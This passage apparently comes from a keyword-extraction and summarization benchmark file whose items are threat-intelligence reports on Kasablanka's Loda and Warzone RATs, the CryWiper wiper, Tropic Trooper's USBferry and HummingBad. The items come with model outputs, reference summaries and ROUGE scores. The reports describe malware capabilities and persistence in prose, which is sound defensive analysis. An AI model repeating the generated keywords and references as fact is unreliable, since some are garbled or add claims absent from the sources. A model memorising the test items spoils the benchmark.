years. And the use of these two formats can effectively circumvent the MOTW mechanism (a security measure in which Windows displays a warning message when a user tries to open a file downloaded from the Internet). The effectiveness of the Lazarus group's attack campaign was evident back in November '22 when we disclosed that its attack components using the vhdx format had a detection rate of 0 on VirusTotal.When combing through the recently uploaded vhdx files we found that from September to December 2022, Kasablanka group is suspected of attacking Russia, and its targets include the Russian Federal Government Cooperation Agency, the Ministry of Foreign Communications of the Astrakhan Region of Russia, etc., and the detection rate of some samples is always 0.Analyzing and organizing the captured samples, the Kasablanka group used a socially engineered phishing email as the entry point for the attack, with a virtual disk image file attached, which nested a variety of next-stage payload executions including lnk files, zip packages, and executables. In the early stages of the attack the final execution was the commercial Trojan Warzone RAT, in the later stages of the attack we observed that the executed Trojan changed to Loda RAT.1/21Decoy FileA phishing attack against the Agency of the Government of the Russian Federation for CIS Affairs, Aliens and International Humanitarian Cooperation, or \"\u0420\u043e\u0441\u0441\u043e\u0442\u0440\u0443\u0434\u043d\u0438\u0447\u0435\u0441\u0442\u0432\u043e\".The translation of the phishing email content is as follows\uff1a2/21Phishing email attack against the Ministry of Foreign Communications of the Astrakhan Region of Russia.The translation of the phishing email is as follows:3/21One of the phishing email attachments uses the situation related to the Republic of Turkey in 2022 as a bait.Attacks using articles related to Russian import substitution and migration policy in 2015 as bait.4/21In addition, the Kasablanka group intercepted the first page from Resolution No. 1725 published on the official website of the Government of the Russian Federation as a decoy.5/21And the relevant content of the draft Digital Code of Kyrgyzstan was used as a bait.6/21Sample AnalysisThe captured samples are all virtual disk image files (.vhdx suffix), and the sample decoy names and contents are in Russian and uploaded from Russian regions. Some of the samples use lnk files as Loda RAT been sold publicly on the internet as a software subscription since 2018 and is compatible with systems below Windows 10, with remote desktop, password stealing, keylogging, remote commands, permission elevation, download execution and many other remote control functions. It has been used by several APT groups, including Confucius, Bitter, Blind Eagle (APT-Q-98) and other groups .9/21This captured Warzone RAT eventually establishes a TCP connection to the server 0x28Obtain information about the controlled machine Get process list information Get drive information Get directory information Retrieving files from the victim device's folder Delete the specified file Ends the specified process Remote shell Ends the specified thread List the victim's camera device information Turn on the camera Stop the camera Get the title of the active program Exit and delete your own files Downloading files to the controlled end Get browser password Download the file from the given URL to the controlled end and execute it Install HRDP Manager on the victim's device11/21Function 0x4CLoda RATFunctionEnable reverse proxy Stop reverse proxy Start remote VNC Shutting down remote VNC Reverse proxy port settings Execute or open the specified file Injection into the specified process Traversing to get file information Multiple post-command breakdowns, including shutdown, network test, exit, etcLoda RAT is a proprietary malware written in AutoIt script language, first captured and disclosed in the wild by Proofpoint in September 2016, the name 'Loda' derives from the malware author's choice of directory to write keylogger logs to as Loda.Subsequently Cisco discovered multiple variants of Loda RAT and found that the RAT added spying capabilities to the Android platform. After a series of investigations, Cisco concluded that the group using the malware was based in Morocco and named the group Kasablanka (the largest city in Morocco) [1].Analysis of the captured sample showed that it was written in C# and obfuscated so extensively that common tools could not decompile it, and added a large amount of 00 data at the end of the PE file, swelling the entire file size to 741MB.12/21After execution, the sample first releases and executes the Loda RAT packaged with AutoIt in the %appdata% directory, and the AutoIt script can be restored by using the deep analysis function of QiAnXin's Threat Intelligence Center Cloud Sandbox, and the behavior and functions of the trojan can be seen by analyzing the script.Loda RAT first detect antivirus products installed on victim machines through WMI commands.13/21Followed operation is collecting some information of victim host, including permissions, operating system version, etc.14/21And adding persistentence by creating %appdata%\\Windata\\svshost.exe and NFOKQN.lnk shortcut to svshost.exe in windows startup directory.Uploading the collected information and then takeing screenshots.15/21Subsequently enter the remote control loop, by processing the data returned by C2, and then correspond to the detailed remote control instructions, and its remote control instructions divided into a relatively fine function, rough statistics have 144 remote control instructions, due to the reasons of space, we will not do a detailed introduction, a general overview of its remote control functions.Recording Upload and download files Execute the specified file Shutdown Close the specified process Stealing user cookies, passwords Turn on keylogger Delete keylogger data Download and execute the file from the specified URL Get file or directory size Allow RDP connections by modifying the registry Compressing/uncompressing files Copy files or directories Enumerate connected drives Enumerate hot folder locations Detect UAC settings Send mouse clicks (to the left or right is a separate command\uff09 Capture screenshots and send to C2 Open/close CD trays Recording Turn off Windows Firewall Send the name of running processes to C2 Exit, uninstall Create a GUI chat window to save the victim/attacker conversation to a file16/21In addition, in the previous version, LodaRAT downloaded SQLite3.dll from the official AutoIt website because it was needed to extract sensitive information from the browser database, but the embedded URL had been unavailable for download. So in the latest version, the Kasablanka group transcoded it function is to download WinScp tools to synchronize files with remote computers and set scheduled tasks follow-up payload to execute, and the payload is Warzone RAT or CS Trojan.18/21Some security vendors believe that Loda RAT is the exclusive trojan of Kasablanka group, but since Loda RAT is compiled from AutoIt scripts and its source code can be obtained by decompiling it, 'false flag' activities by other threat actors using the decompiled source code are also possible.In terms of attack motivation, we believe that the purpose of this attack is mainly for information gathering and espionage. Considering the current situation between Russia and Ukraine, intelligence spying and espionage are more in line with the motivation of nation-sponsered hacker groups, so we attribute this attack to Kasablanka group with moderate confidence. SummaryIn previous disclosures of the Kasablanka group's operations, its targets included Bangladesh, South America and the United States, and its Loda RAT includes Windows version and Android version.Now this group often uses commercial RATs in its attack activities, which not only reduces the development cost but also makes it difficult for tracing attackers\u2019 footprints.The RedDrip team would like to remind all users not to open links of unknown origin shared by social media, not to click on email attachments from unknown sources, not to run unknown files with exaggerated titles, not to install APPs from informal sources, to back up important files in a timely manner, and to update and install patches.If you need to run or install an application of unknown origin, you can first identify it through the QiAnXin Threat Intelligence File Deep Analysis Platform (url At present, it supports deep analysis of files in various formats including Windows and Android platforms.Currently, a full line of products based on the threat intelligence data from the QiAnXin Threat Intelligence Center, including the QiAnXin Threat Intelligence Platform (TIP), SkyRock, QiAnXin Advanced Threat Detection System, QiAnXin NGSOC, QiAnXin Situational Awareness, etc., already support the accurate Reference Links[1] url url ", "generated_text": "Kasablanka; APT; Russian; the group; a phishing email; a virtual disk image file; the phishing email; a decoy; the initial stages; the Trojan; lnk files; zip packages; Executables; the Loda RAT; similarities; Lazarus; the malware; the first page; Resolution No. 1725; the Government; the Russian Federation; the second stage; the Loda RAT; the user; the malware; PID; 0; detection; the samples; documents; the group; a software subscription; 2018; indicators; compromise; the attack.", "ref_text": "<START-1>The cybersecurity company QiAnXin discovered that the hacking group Kasablanka conducted campaigns targeting organizations in Russia between September and December 2022. The group sent phishing emails with .vhdx virtual hard disk files attached that contained malicious payloads. The emails posed as communications related to the Russian government and current events to encourage targets to open them. The virtual disk files contained lnk files, zip files, and executables that installed remote access Trojans like Warzone RAT and Loda RAT on target systems. Loda RAT was packed in an obfuscated executable over 700MB large. It could stealthily capture screenshots, keylogs, files, and other data. Warzone RAT connected to a command and control server to allow the attackers full remote control. Earlier versions embedded the RATs directly in the Word documents. Later versions hid them in image files downloaded by the initial scripts. The PowerShell code used string obfuscation techniques to avoid detection. QiAnXin believes the attackers aim to gather intelligence and conduct espionage. While Loda RAT was previously tied to Kasablanka, other groups could be copying its code. The targeting of Russian organizations and use of the Russian language/current events suggests a nation-state actor likely conducted this campaign. QiAnXin recommends updating software and not opening suspicious emails or files. <END-1>", "t5/keyword/hint_hit_precision": 0.2777777777777778, "t5/word/hint_hit_recall": 0.06280193236714976, "gpt3/lexical/rouge_rouge1": 0.43315508021390375, "gpt3/lexical/rouge_rouge2": 0.0913978494623656, "gpt3/lexical/rouge_rougeL": 0.1978609625668449, "gpt3/lexical/rouge_rougeLsum": 0.1978609625668449, "gpt3_generated_text": ["The article discusses the suspected targeting of Russia by the Kasablanka group, an APT group known for using uncommon file types like virtual disk image files in their attack campaigns. The group used socially engineered phishing emails with attachments containing various payloads, including lnk files and executables, to deliver the Warzone RAT in the initial stages and later switching to the Loda RAT. The samples analyzed were all virtual disk image files with decoy names and contents in Russian, uploaded from Russian regions. The Loda RAT, a proprietary malware with spying capabilities, was observed establishing TCP connections and carrying out various functions on the victim's device. The group's tactics bear similarities to those of Lazarus group, with some samples having a detection rate of 0 on VirusTotal, indicating a high level of immunity against antivirus software. They used decoys like official documents and articles related to Russian policies as bait for their attacks, showing a sophisticated and targeted approach towards compromising their targets."]}, {"split_name": "val", "sample_id": "val_37", "prompt_text": "Extract the keywords: www.bleepingcomputer.com /news/security/new-crywiper-data-wiper-targets-russian-courts-mayor-s-offices/ New CryWiper data wiper targets Russian courts, mayor\u2019s offices Bill Toulas \u22ee \u22ee 12/2/2022A previously undocumented data wiper named CryWiper is masquerading as ransomware, but in reality, destroys data beyond recovery in attacks against Russian mayor's offices and courts.CryWiper was first discovered by Kaspersky this fall, where they say the malware was used in an attack against a Russian organization.\"In the fall of 2022, our solutions detected attempts by a previously unknown Trojan, which we named CryWiper, to attack an organization's network in the Russian Federation,\" explains the new report by Kaspersky.However, a report by by Russian media says that the malware was used in attacks against Russian mayor's offices and courts.As the code analysis reveals, the data-wiping function of CryWiper isn't a mistake but a purposeful tactic to destroy targets' data. Wiping the victim's dataCryWiper is a 64-bit Windows executable named 'browserupdate.exe' written in C++, configured to abuse many WinAPI function calls.Upon execution, it creates scheduled tasks to run every five minutes on the compromised machine.Creation of scheduled task (Kaspersky)Next, it contacts a command and control server (C2) with the name of the victim's machine. The C2 responds with either a \"run\" or \"do not run\" command, determining whether the wiper will activate or stay dormant.Kaspersky reports seeing execution delays of 4 days (345,600 seconds) in some cases, likely added in the code to help confuse the victim as to what caused the infection.CryWiper will stop critical processes related to MySQL, MS SQL database servers, MS Exchange email servers, and MS Active Directory web services to free locked data for destruction.1/2Services killed by CryWiper (Kaspersky)Next, the malware deletes shadow copies on the compromised machine to prevent the easy restoration of the wiped files.CryWiper also modifies the Windows Registry to prevent RDP connections, likely to hinder intervention and incident response from remote IT specialists.Finally, the wiper will corrupt all enumerated files except for \".exe\", \".dll\", \"lnk\", \".sys\", \".msi\", and its own \".CRY\", while also skipping System, Windows, and Boot directories to prevent rendering the computer completely unusable.The algorithm for corrupting the files is based on \"Mersenne Twister,\" a pseudorandom number generator. This is the same algorithm used by IsaacWiper, but the researchers established no further connection between the two families.After this step, CryWiper will generate ransom notes named 'README.txt,' asking for 0.5 Bitcoin (approximately $8,000) in exchange for a decrypter. Unfortunately, this is a false promise, as the corrupted data cannot be restored.Ransom note generated by CryWiper (Kaspersky)Even though CryWiper is not ransomware in the typical sense, it can still cause severe data destruction and business interruption.Kaspersky says CryWiper does not seem to be associated with any wiper families emerging in 2022, like DoubleZero, IsaacWiper, HermeticWiper, CaddyWiper, WhisperGate, AcidRain, and Industroyer2.Update 11/2/2: Added further information about CryWiper targets (h/t Risky Biz).2/2 ", "generated_text": "data wiper; CryWiper; an unknown Trojan; an attack; Russian; the malware; a 64-bit Windows executable; browserupdate.exe; scheduled tasks; the compromised machine; scheduled tasks; the compromised machine; MySQL; MS SQL; Exchange; email servers; Active Directory web services; the wiper; shadow copies; system; boot directories; RDP connections; an attack; DoubleZero; IsaacWiper; CaddyWiper; WhisperGate; AcidRain; Industroyer.", "ref_text": "<START-1>The document describes a new data wiper malware called CryWiper that has been used in attacks against Russian organizations, including mayor's offices and courts. CryWiper was first discovered by Kaspersky in fall 2022 being used against a Russian entity. CryWiper masquerades as ransomware but is actually designed to permanently destroy data beyond recovery. It creates scheduled tasks to repeatedly run on compromised systems. It contacts a command and control server which can remotely activate the wiping process. CryWiper stops critical database and email services, deletes shadow copies, and modifies the registry to prevent remote access. It then corrupts files on the system while skipping certain directories and file types to avoid fully disabling the computer. After wiping files, it generates a fake ransom note demanding payment in Bitcoin to decrypt files, even though restoration is not possible. The wiping uses an algorithm called Mersenne Twister, distinct from other 2022 wipers like IsaacWiper. While not true ransomware, CryWiper can still cause severe data destruction and business disruption. It does not appear related to major 2022 wipers like WhisperGate and AcidRain that targeted Ukraine. CryWiper has been deployed against Russian entities, marking a change from wipers focused on Ukraine. In summary, CryWiper is a destructive new data wiper used in attacks on Russian mayor's offices and courts, masquerading as ransomware while making reliable data recovery impossible. <END-1>", "t5/keyword/hint_hit_precision": 0.3103448275862069, "t5/word/hint_hit_recall": 0.05357142857142857, "gpt3/lexical/rouge_rouge1": 0.45180722891566266, "gpt3/lexical/rouge_rouge2": 0.21212121212121213, "gpt3/lexical/rouge_rougeL": 0.30120481927710846, "gpt3/lexical/rouge_rougeLsum": 0.30120481927710846, "gpt3_generated_text": ["The article discusses a new data wiper named CryWiper, which is masquerading as ransomware but actually destroys data beyond recovery in attacks against Russian mayor's offices and courts. CryWiper, a 64-bit Windows executable named 'browserupdate.exe', creates scheduled tasks on compromised machines and contacts a command and control server to determine when to activate. It stops critical processes related to MySQL, MS SQL, Exchange, and Active Directory, deletes shadow copies, and corrupts files using a pseudorandom number generator. The malware generates false ransom notes asking for Bitcoin but cannot restore the corrupted data. CryWiper is not associated with other wiper families emerging in 2022."]}, {"split_name": "val", "sample_id": "val_38", "prompt_text": "Extract the keywords: 5/14/2020Tropic Trooper\u2019s Back: USBferry Attack Targets Air-gapped Environments - TrendLabs Security Intelligence BlogTrend Micro About TrendLabs Security Intelligence BlogSearch:Home CategoriesHome \u00bb Malware \u00bb Tropic Trooper\u2019s Back: USBferry Attack Targets Air-gapped EnvironmentsTropic Trooper\u2019s Back: USBferry Attack Targets Air-gapped EnvironmentsPosted on:May 12, 2020 at 5:18 am Posted in:Malware, Targeted Attacks Author: Trend Micro0By Joey Chen (Threats Analyst) Tropic Trooper, a threat actor group that targets government, military, healthcare, transportation, and high-tech industries in Taiwan, the Philippines, and Hong Kong, has been active since 2011. The group was reportedly using spear-phishing emails with weaponized attachments to exploit known vulnerabilities. Primarily motivated by information theft and espionage, the group has also been seen adopting different strategies such as \ufb01ne-tuning tools with new behaviors and going mobile with surveillanceware. We found that Tropic Trooper\u2019s latest activities center on targeting Taiwanese and the Philippine military\u2019s physically isolated networks through a USBferry attack (the name derived from a sample found in a related research). We also observed targets among military/navy agencies, government institutions, military hospitals, and even a national bank. The group employs USBferry, a USB malware that performs different commands on speci\ufb01c targets, maintains stealth in environments, and steals critical data through USB storage. We started tracking this particular campaign in 2018, and our analysis shows that it uses a fake executable decoy and a USB trojan strategy to steal information. Based on data from the Trend Micro\u2122 Smart Protection Network\u2122 security infrastructure, USBferry attacks have been active since 2014. We found the group was focused on stealing defense-, ocean-, and ship-related documents from target networks, which led us to believe that Tropic Trooper\u2019s main purpose is to ex\ufb01ltrate con\ufb01dential information or intelligence.url Trooper\u2019s Back: USBferry Attack Targets Air-gapped Environments - TrendLabs Security Intelligence BlogFigure 1. A sample scenario of the USBferry attackTropic Trooper is well aware that military or government organizations may have more robust security in their physically isolated environments (i.e., the use of biometrics or USB use in a quarantined machine before an air-gapped environment). The group then targets potentially unsecured related organizations that could serve as jumping-off points for attacks. For instance, we observed Tropic Trooper move from a military hospital to the military\u2019s physically isolated network. This blog post provides an overview of the USB malware called USBferry and its capabilities, as well as the other tools used to in\ufb01ltrate physically isolated environments. Further details, including indicators of compromise (IoCs), can be read in the technical brief. A USB malware called USBferry We \ufb01rst encountered the malware from a PricewaterhouseCoopers report that mentioned a sample related to Tropic Trooper but did not include a detailed analysis. We looked into it further and discovered many versions of it, including several program database (PDB) strings. For one thing, the USBferry malware already has at least three versions, with different variants and components, at the time of writing. Here are the noteworthy points we gathered during analysis:The \ufb01rst version has a small component of TROJ_YAHOYAH. The malware tries to check if the target machine has a USB plug-in and copies the USBferry installer into the USB storage. The activities vary in target environments; some execute commands, source target \ufb01les or folder lists, and copy \ufb01les from physically isolated hosts to compromised hosts, among other things.Figure 2. USBferry malware\u2019s \ufb01rst version, where the EXE \ufb01le is the USBferry malware and the DLL \ufb01le is trojan TROJ_YAHOYAHThe second version has the same capabilities as the \ufb01rst and combines components into one executable. This version also changes the malware location and its name to UF, an abbreviation for USBferry.The third version retains the previous versions\u2019 capabilities and improves its stealth in the target environment by residing in the rundll32.exe memory.Figure 3. USBferry malware\u2019s second version combined into one \ufb01leurl Trooper\u2019s Back: USBferry Attack Targets Air-gapped Environments - TrendLabs Security Intelligence BlogFigure 4. USBferry malware\u2019s third version becomes resident in memoryHow USBferry targets air-gapped systems In our technical brief, we broke down how Tropic Trooper has changed the way it uses the abovementioned USBferry versions in attacks. The group achieves infection by employing the USB worm infection strategy and ferrying a malware installer via USB into an air-gapped host machine.Here we will discuss the notable changes in the group\u2019s latest attack chain that uses version UF1.0 20160226 (detected by Trend Micro as TROJ_USBLODR.ZAHB- A):Figure 5. USBferry malware using USB worm infection strategyFigure 6. USBferry attack scenario, version UF1.0 201602261. The decoy \ufb01le \ufb01rst drops a \ufb02ash_en.inf DLL \ufb01le, which is a USBferry loader, and tries to load the encrypted USBferry malware 2. The encrypted USBferry malware is embedded in the loader resource section, and the loader drops it into the C:\\Users\\Public\\Documents\\Flash folder and 3. After the encrypted payload is loaded, the loader injects a malicious DLL into rundll32.exe. The USBferry malware also loads a C&C con\ufb01guration \ufb01le and 4. The USBferry malware then tries to connect to the download site and uses a Windows command to collect/copy target host datanames it \ufb02ash.dat \ufb02ash_en.dat, which is also located in the C:\\Users\\Public\\Documents\\FlashThis version checks for network connectivity; if it \ufb01nds that the network is unavailable, it tries to collect information from the target machine and copy the collected data into USB storage. This way, the USB ex\ufb01ltrates the information and sends it back to the C&C server. Backdoors and other tools used by Tropic Trooper Some backdoors used by Tropic Trooper use injection to execute its routines, while others execute directly and run itself consistently. The group also uses steganography to mask their backdoor routines and evade anti-malware and network perimeter detection. To \ufb01nd the full list of the backdoors we analyzed, check out our technical brief. Here we will tackle some of the noteworthy backdoors Tropic Trooper used.WelCome To Svchost 3.2 20110818\u2019s backdoor (detected as BKDR_SVCSHELL.ZAHC-A) \u2013 This backdoor bears similarities with a payload we discussed in our previous research. Based on the malware version number, this backdoor\u2019s \ufb01rst version was developed in or before 2011. This means that Tropic Trooper\u2019s activities have been ongoing for at least ten years now.url Trooper\u2019s Back: USBferry Attack Targets Air-gapped Environments - TrendLabs Security Intelligence BlogFigure 7. The backdoor version name, registered service name, and malware components\u2019 \ufb01lenamesWelcome To IDShell 1.0 20150310\u2019s backdoor (detected as BKDR_IDSHELL.ZTFC-A) \u2013 The purpose of this backdoor, which has two types, including a steganography jpg version, is to recon the target machine. Like other versions, it uses the DNS protocol to communicate with the backdoor controller. The traf\ufb01c is encrypted to evade detection.Hey! Welcome Server 2.0\u2019s backdoor (detected as BKDR_TEBSHELL.ZTGK) \u2013 This is the latest version of the backdoor, available in 32-bit and 64-bit versions, which uses an invisible web shell for remote control and network security evasion. It runs the process as a service, hides backdoor communication in normal traf\ufb01c, and uses customized TCP protocol. It also improves the way it handles wrong input commands and unauthorized access.Figure 8. The backdoor\u2019s communication traf\ufb01cFigure 9. The executable version will install and name it as a Windows service, change registry to disable error display, and launch the serviceTropic Trooper also used other tools in their attacks, such as:Command-line remote control listener/port relay tool, which has different versions that can communicate with the backdoor. Backdoor payload/steganography payload execution loaders, which have two versions that can be used to successfully load the encrypted payload and subsequently delete itself and the payload. Port scanning tools, which are available on the internet.The overview provided above highlights how putting critical information in physically isolated networks is not a bulletproof solution for defending against cyberespionage. Steganography isn\u2019t just used to deliver encrypted payloads; it can also be used to transfer information to a C&C server. Multiple hacking tools and components can also help facilitate successful attacks on different networks and environments. Threat actors like Tropic Trooper can also use an invisible web shell to hide its C&C server location and make incident response tricky. MITRE ATT&CK Matrixurl Trooper\u2019s Back: USBferry Attack Targets Air-gapped Environments - TrendLabs Security Intelligence BlogBest practices and Trend Micro solutions The latest developments with Tropic Trooper indicate that they are well-prepared to target government institutions and military agencies for stolen intelligence. The group also takes a long time to perform reconnaissance and consequently in\ufb01ltrate physically isolated networks. This research also underscores how threat actors could see potentially vulnerable targets as launch points for extending their attack attempts to other, more critical targets. Understanding attack tactics and techniques can provide the needed context for assessing potential impact and adopting defensive strategies. Here are some measures that organizations can practice to thwart advanced persistent threats with security that employs actionable threat intelligence, network-wide visibility, and timely threat protection:Enforce the principle of least privilege. Employ network segmentation and data categorization to deter lateral movement and mitigate exposure. Keep the system and its applications up-to-date. Weaknesses in the network can serve as entry points for attacks. Enforce a strong patch management policy and consider virtual patching for legacy systems. Regularly monitor your perimeter. Adopt cross-layer detection and response across gateways, endpoints, networks, and servers to protect against a wide range of cybersecurity threats. Firewalls and intrusion detection and prevention systems can help defend against network-based attacks.url Trooper\u2019s Back: USBferry Attack Targets Air-gapped Environments - TrendLabs Security Intelligence Blog5/14/2020 Organizations can take advantage of the Trend Micro Apex One\u2122 solution, which provides actionable insights, expanded investigative capabilities, and centralized visibility across the network through a variety of threat detection capabilities such as behavioral analysis that protects against malicious scripts, injection, ransomware, memory, and browser attacks. A multilayered security solution such as Trend Micro\u2122 Deep Discovery\u2122 can also be considered; it provides in-depth analysis and proactive response to attacks using exploits and other similar threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect these attacks even without any engine or pattern updates. Read our technical brief, which discusses in full our analyses of Tropic Trooper\u2019s recent activities, the USBferry malware, and IoCs. Related Posts:Operation ENDTRADE: Finding Multi-Stage Backdoors that TICK MuddyWater Resurfaces, Uses Multi-Stage Backdoor POWERSTATS V3 and New Post-Exploitation Tools Shifting Tactics: Breaking Down TA505 Group\u2019s Use of HTML, RATs and Other Techniques in Latest Campaigns Gamaredon APT Group Use Covid-19 Lure in CampaignsLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bbTags: cyberespionageKeyBoymilitaryUSBUSBferry0 CommentsTrendLabs\ud83d\udd12 Privacy PolicyRecommend\uf108t Tweet f ShareLogin\ue6031 Sort by BestStart the discussion\u2026LOG IN WITHOR SIGN UP WITH DISQUS?SubscribeAdd Disqus to your siteAdd DisqusAddd\u2709 Security Predictions for 2020D N t S ll M D t\u26a0Cybersecurity in 2020 will be viewed through many lenses \u2014 from differing attacker motivations and cybercriminal arsenal to technological developments and global threat intelligence \u2014 only so defenders can keep up with the broad range of threats. Read our security predictions for 2020.Business Process CompromiseAttackers are starting to invest in long-term operations that target speci\ufb01c processes enterprises rely on. They scout for vulnerable practices, susceptible systems and operational loopholes that they can leverage or abuse. To learn more, read our Security 101: Business Process Compromise.Recent PostsMay Patch Tuesday: More Fixes for SharePoint, TLS, Runtime, and Graphic Components Released Tropic Trooper\u2019s Back: USBferry Attack Targets Air-gapped Environments New MacOS Dacls RAT Backdoor Show Lazarus\u2019 Multi-Platform Attack Capability Targeted Ransomware Attack Hits Taiwanese Organizations WebMonitor RAT Bundled with Zoom InstallerPopular Posts url Trooper\u2019s Back: USBferry Attack Targets Air-gapped Environments - TrendLabs Security Intelligence BlogExposed Redis Instances Abused for Remote Code Execution, Cryptocurrency Mining WebMonitor RAT Bundled with Zoom Installer Exposing Modular Adware: How DealPly, IsErIk, and ManageX Persist in Systems Coronavirus Update App Leads to Project Spy Android and iOS Spyware New MacOS Dacls RAT Backdoor Show Lazarus\u2019 Multi-Platform Attack CapabilityStay Updated Email SubscriptionHome and Home Of\ufb01ce About Trend Micro Asia Paci\ufb01c Region (APAC): Australia / New Zealand, , \u2f47, \ub300\ud55c\ubbfc\uad6d,  Latin America Region (LAR): Brasil, M\u00e9xico North America Region (NABU): United States, Canada Europe, Middle East, & Africa Region (EMEA): France, Deutschland / \u00d6sterreich / Schweiz, Italia, \u0420\u043e\u0441\u0441\u0438\u044f, Espa\u00f1a, United Kingdom / Ireland Copyright \u00a9 2020 Trend Micro Incorporated. All rights reserved.url ", "generated_text": "the USB malware; malware; USBferry; attacks; government; military; healthcare; transportation; high-tech industries; Taiwan; the Philippines; Hong Kong; 2020; targets; Taiwanese; the Philippine military; the USB; key; commands; data; USB storage; the group; at least three versions; functions; encryption; zero-day; detection; a USB plug-in; a USB trojan; samples; testing; other tools; data; a decoy; a USB plug-in; a USB server; information; the USB; C&C servers; Analysis; targets; military/navy agencies; government institutions; military hospitals; a national bank; targets; unsecured related organizations; defense; infrastructure; the group; spear-phishing emails; vulnerabilities; new behaviors; Mobile surveillanceware.", "ref_text": "<START-1>The PDF discusses attacks by a threat actor group called Tropic Trooper that targets government, military, and other organizations in Taiwan, the Philippines, and Hong Kong. - Tropic Trooper has been active since at least 2011, using spear phishing and weaponized attachments to steal information. - Their latest campaign uses a type of USB malware called USBferry to target air-gapped networks of military and government organizations. - USBferry infects air-gapped systems by copying itself to USB devices that are then inserted into the isolated systems. It can collect files and data from the air-gapped system and transfer them out when the USB device is removed. - There are at least three versions of USBferry that have different capabilities for evading detection, executing commands, etc. The latest version resides in memory to hide itself. - Tropic Trooper first compromises related organizations like military hospitals to use as a jumping off point to get to the more secure air-gapped networks. - They have a variety of custom backdoors and tools to maintain access, communicate with compromised systems, scan networks, etc. Some use steganography to hide communications. - Recommendations include enforcing least privilege, keeping systems patched and updated, monitoring networks, and using security solutions that provide visibility and threat detection across the environment. Understanding the tactics and techniques of threat actors can help organizations better defend against targeted attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.2777777777777778, "t5/word/hint_hit_recall": 0.09734513274336283, "gpt3/lexical/rouge_rouge1": 0.48931116389548696, "gpt3/lexical/rouge_rouge2": 0.16706443914081145, "gpt3/lexical/rouge_rougeL": 0.2517814726840855, "gpt3/lexical/rouge_rougeLsum": 0.2517814726840855, "gpt3_generated_text": ["The Tropic Trooper threat actor group, known for targeting government, military, healthcare, transportation, and high-tech industries in Taiwan, the Philippines, and Hong Kong, has resurfaced with a new type of attack. This time, they are using a USB malware called USBferry to target air-gapped environments, specifically the Taiwanese and Philippine military's physically isolated networks. The group has at least three versions of the malware, each with different capabilities such as executing commands, stealing data from USB storage, and maintaining stealth in the target environment. Tropic Trooper's main goal appears to be exfiltrating confidential information and intelligence from their targets, which include military/navy agencies, government institutions, military hospitals, and even a national bank. The group is well aware of the security measures in physically isolated environments and targets potentially unsecured organizations that could serve as entry points for their attacks. This campaign has been active since 2014, with a focus on stealing defense-related documents. The malware has evolved over time, with the latest version improving its stealth by residing in the rundll32.exe memory. Analysis of the malware and its capabilities, as well as indicators of compromise, are provided in a technical brief."]}, {"split_name": "val", "sample_id": "val_39", "prompt_text": "Extract the keywords: From HummingBad to WorseNEW DETAILS AND AN IN-DEPTH ANALYSIS OFTHE HUMMINGBAD ANDROID MALWARE CAMPAIGNFor five months, Check Point mobile threat researchers had unprecedented, behind-the- scenes access to a group of cybercriminals in China. This group created a malware that takes over Android devices and generates $300,000 per month in fraudulent ad revenue. The group effectively controls an arsenal of over 85 million mobile devices around the world. With the potential to sell access to these devices to the highest bidder, Check Point researchers say similar malware campaigns may become a trend. In February 2016, Check Point researchers first discovered HummingBad, a malware that establishes a persistent rootkit on Android devices, generates fraudulent ad revenue, and installs additional fraudulent apps. Since then, researchers saw an increasing number of instances in the wild and have traced the attack campaign\u2019s source. This investigation uncovered critical insights on how attackers conduct mobile malware campaigns:Figure 1: Data from Check Point gateways detailing the number ofHummingBad instances researchers have seen in the wild.\u2022 The HummingBad campaign runs alongside a legitimate advertising analytics business, sharingtheir technology and resources, enabling it to control tens of millions of Android devices\u2022 The campaign generates $300,000 a month; proving attacks can achieve financial self-sufficiencyFinancial gain is just the tip of the iceberg:\u2022 The group tries to root thousands of devices every day and is successful in hundreds of attempts \u2022 With these devices, a group can create a botnet, carry out targeted attacks on businesses or government agencies, and even sell the access to other cybercriminals on the black market\u2022 Any data on these devices is at risk, including enterprise data on those devices that serve dualpersonal and work purposes for end usersAccessing these devices and their sensitive data creates a new and steady steady stream of revenue for cybercriminals. Emboldened by financial and technological independence, their skillsets will advance \u2013 putting end users, enterprises, and government agencies at risk.\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 1Meet the Yingmob Following the command and control (C&C) servers used by the original HummingBad samples detected in February, researchers found the attackers\u2019 repositories. These repositories belong to Yingmob, a Chinese mobile ad server While other research firms associate Yingmob with an iOS malware called Yispecter, Check Point researchers determined that the same group is also behind HummingBad: \u2022Yispecter uses Yingmob\u2019s enterprise certificates to install itself on devices\u2022 HummingBad and Yispecter share C&Cserver addresses\u2022 HummingBad repositories contain QVODdocumentation, an iOS porn player targeted by Yispecter\u2022 Both install fraudulent apps to gain revenue. Yingmob has several teams developing legitimate tracking and ad platforms. The team responsible for developing the malicious components is the \u201cDevelopment Team for Overseas Platform\u201d which includes four groups with a total of 25 employees. This team sits in Level 5, Xingdu Plaza, 73 Beiqu Rd., Yuzhong, Chongqing, China. The team has three development projects: \u2022 Eomobi: HummingBad malicious components \u2022 Hummer Offers: Ad server analytics platform \u2022 Hummer Launcher: Ad server Androidapplication package (APK)The development team has six product lines: 1. Eobomi 2. Hummer launcher 3. Root Software Development Kit (SDK) 4. Hummer Offers 5. MAT 6. UnitemobiFigure 2: Yingmob's Offices In ChongqingFigure 3: Seating Plan of Yingmob's Offices In ChongqingFigure 4: Yingmob's Organization\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 2HummingBad Takes Flight Worldwide Analysis of the HummingBad code revealed that it sends notifications to Umeng, a tracking and analytics service from which the attackers manage the campaign. Further analysis of Yingmob\u2019s Umeng account revealed the extent of the HummingBad campaign. The control panel registers almost 200 apps, most of which are different variations of the same core apps. Check Point researchers suspect about 25% of these apps are malicious. All combined, the campaign includes nearly 85 million devices.Active Times Cumulative userNew userActive userToday Yesterday Yesterday independent userAccording to the interface, activity began in August 2015, and is seen below in the graph showing cumulative users over time:Figure 2: Overall Statistics of the Umeng InterfaceFigure 6: Cumulative Users Over Time\u00a92016 Check Point Software Technologies Ltd. All rights reserved | P. 3After analyzing most of the apps on the dashboard, the research team estimates that nearly 10 million users are using these malicious apps. While victims are spread worldwide, India and China take the lead. The top 20 countries with infected devices have more than 100,000 victims each.Malaysia, 113096Ukraine, 117287Algeria, 130129Colombia, 137131Vietnam, 137328Egypt, 140007Romania, 147632 Nepal, 172327Pakistan, 188758Russia, 207940Bangladesh, 209706Thailand, 260128United States, 